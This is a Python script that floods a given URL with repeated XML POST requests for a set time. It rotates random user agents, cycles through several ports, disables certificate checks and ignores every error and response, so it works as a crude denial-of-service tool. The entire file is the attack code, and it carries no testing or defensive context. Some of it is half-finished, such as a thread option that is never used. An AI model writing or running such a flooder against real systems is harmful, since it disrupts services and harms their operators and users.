import requests
import time
import argparse
import random
def read_file(file_name):
    with open(file_name, 'r') as f:
        return f.read()
def get_useragents(file_name):
    useragents = read_file(file_name)
    useragents = useragents.split('\n')
    useragents = list(filter(lambda x: x != '', useragents))
    return useragents
def send_request(url, payload, useragent, port):
    session = requests.Session()
    headers = {'Content-Type': 'application/xml; charset=utf-8', 'User-Agent': useragent, 'Referer': 'objective'}
    try:
        if port == 443:
            response = session.post(url, data=payload.encode('utf-8'), headers=headers, timeout=5, verify=False)
        else:
            response = session.post(f"{url}:{port}", data=payload.encode('utf-8'), headers=headers, timeout=5, verify=False)
    except Exception as e:
        pass
def main(url, run, thread):
    useragents = get_useragents('ua.txt')
    data = read_file('data.xml')
    threads_finished = 0
    start_time = time.time()
    while time.time() - start_time < run:
        useragent = random.choice(useragents)
        port_list = [443, 80, 8080, 8000, 53]
        for port in port_list:
            try:
                send_request(url, data, useragent, port)
            except Exception as e:
                pass
            threads_finished += 1
    print(f'Done.')
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True)
    parser.add_argument('--run', required=True)
    parser.add_argument('--thread', required=True)

    args = parser.parse_args()
    main(args.url, int(args.run), int(args.thread))
